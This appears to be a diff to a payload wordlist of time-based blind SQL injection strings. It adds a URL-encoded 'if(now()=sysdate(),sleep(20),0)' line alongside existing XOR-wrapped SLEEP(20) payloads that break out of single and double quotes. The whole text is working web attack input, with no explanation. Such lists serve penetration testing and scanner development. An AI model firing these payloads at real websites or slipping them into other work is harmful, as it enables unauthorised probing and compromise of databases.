@@ -1,3 +1,4 @@
+if(now()=sysdate()%2Csleep(20)%2C0)
 1'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
 "XOR(if(now()=sysdate(),sleep(20),0))XOR"
 'XOR(SELECT(0)FROM(SELECT(SLEEP(20)))a)XOR'Z
